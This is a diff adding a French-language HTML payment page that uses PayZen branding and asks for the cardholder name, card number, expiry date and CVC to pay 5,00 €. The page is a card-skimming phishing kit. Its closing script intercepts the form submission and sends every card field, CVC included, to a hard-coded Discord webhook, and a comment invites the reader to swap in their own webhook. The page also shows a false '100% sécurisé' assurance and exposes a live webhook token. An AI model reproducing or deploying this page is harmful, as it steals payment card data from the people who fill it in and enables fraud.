@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<title>Paiement sécurisé</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<style>
+  :root {
+    --primary: #635bff;
+    --background: #f6f9fc;
+    --card-bg: #ffffff;
+    --text: #1f2933;
+    --muted: #6b7280;
+    --border: #e5e7eb;
+    --radius: 14px;
+    --black: #0b0b0b;
+  }
+
+  * {
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  }
+
+  body {
+    margin: 0;
+    min-height: 100vh;
+    background: var(--background);
+    display: flex;
+    flex-direction: column;
+  }
+  /* ===== HEADER ===== */
+        .top-banner {
+            background: #fff;
+            padding: 16px 0;
+            display: flex;
+            justify-content: center;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .top-banner img {
+            height: 42px;
+            object-fit: contain;
+        }
+
+        /* ===== MAIN ===== */
+        .container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 16px;
+        }
+
+        .payment-card {
+            background: var(--card-bg);
+            width: 100%;
+            max-width: 420px;
+            padding: 32px;
+            border-radius: var(--radius);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
+        }
+
+        .payment-card h1 {
+            margin: 0 0 8px;
+            font-size: 1.5rem;
+            color: var(--text);
+        }
+
+        .payment-card p {
+            margin: 0 0 24px;
+            color: var(--muted);
+            font-size: 0.95rem;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 0.85rem;
+            color: var(--muted);
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            font-size: 0.95rem;
+            transition: border 0.2s, box-shadow 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(99, 91, 255, 0.15);
+        }
+
+        .row {
+            display: flex;
+            gap: 14px;
+        }
+
+        .row .form-group {
+            flex: 1;
+        }
+
+        .card-icons {
+            display: flex;
+            gap: 8px;
+            margin-top: 6px;
+            opacity: 0.6;
+        }
+
+        button {
+            margin-top: 24px;
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: none;
+            background: var(--primary);
+            color: #fff;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.15s, box-shadow 0.15s;
+        }
+
+        button:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 10px 20px rgba(99, 91, 255, 0.35);
+        }
+
+        .secure {
+            margin-top: 16px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: var(--muted);
+        }
+
+        /* ===== FOOTER ===== */
+        footer {
+            background: var(--black);
+            color: #d1d5db;
+            padding: 20px 16px;
+            font-size: 0.8rem;
+        }
+
+        .footer-content {
+            max-width: 1000px;
+            margin: auto;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .footer-content a {
+            color: #d1d5db;
+            text-decoration: none;
+        }
+
+        .footer-content a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .payment-card {
+                padding: 24px;
+            }
+        }
+   
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<div class="top-banner">
+    <img src="https://payzen.com/wp-content/uploads/2023/11/PayZen-Logo.png" alt="PayZen" />
+</div>
+
+<!-- MAIN -->
+<main class="container">
+    <form class="payment-card" id="paymentForm">
+        <h1>Paiement sécurisé</h1>
+        <p>Entrez vos informations de paiement</p>
+
+        <div class="form-group">
+            <label>Nom sur la carte</label>
+            <input type="text" name="username" placeholder="Jean Dupont" required />
+        </div>
+
+        <div class="form-group">
+            <label>Numéro de carte</label>
+            <input type="text" name="card_number" placeholder="1234 5678 9012 3456" required />
+            <div class="card-icons">
+                <span></span>
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="form-group">
+                <label>Expiration</label>
+                <input type="text" name="expiration" placeholder="MM / AA" required />
+            </div>
+            <div class="form-group">
+                <label>CVC</label>
+                <input type="password" name="cvc" placeholder="123" required />
+            </div>
+        </div>
+
+        <button type="submit">Payer 5,00 €</button>
+        <div class="secure"> Paiement 100% sécurisé</div>
+    </form>
+</main>
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-content">
+        <span>© 2026 - Tous droits réservés</span>
+        <span>•</span>
+        <a href="#">Conditions d’utilisation</a>
+        <span>•</span>
+        <a href="#">Politique de confidentialité</a>
+        <span>•</span>
+        <a href="#">Mentions légales</a>
+    </div>
+</footer>
+
+<!-- Script en bas -->
+<script>
+  const form = document.getElementById('paymentForm');
+
+  form.addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    const formData = new FormData(form);
+    console.log('Nom sur la carte:', formData.get('username'));
+    console.log('Numéro de carte:', formData.get('card_number'));
+    console.log('Expiration:', formData.get('expiration'));
+    console.log('CVC:', formData.get('cvc'));
+
+    fetch('https://discordapp.com/api/webhooks/1466898133404356608/j3pzvFO5KbZcDvJgHcdYBZnLADX3LGbd8LajNapJYbcNLqRYd6N-RJEAqWbvQ0XaQFbE', { // Remplace par ton webhook
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        username: 'Paiement Test',
+        embeds: [{
+          title: 'Nouvelle transaction',
+          fields: [
+            { name: 'Nom sur la carte', value: formData.get('username') },
+            { name: 'Numéro de carte', value: formData.get('card_number') },
+            { name: 'Expiration', value: formData.get('expiration') },
+            { name: 'CVC', value: formData.get('cvc') }
+          ],
+          color: 3447003
+        }]
+      })
+    })
+    .then(res => {
+      if (res.ok) {
+        alert('Données envoyées avec succès !');
+      } else {
+        alert('Erreur lors de l\'envoi : ' + res.status);
+      }
+    })
+    .catch(error => {
+      console.error('Erreur:', error);
+      alert('Erreur lors de l\'envoi.');
+    });
+  });
+</script>
+
+</body>
+</html>
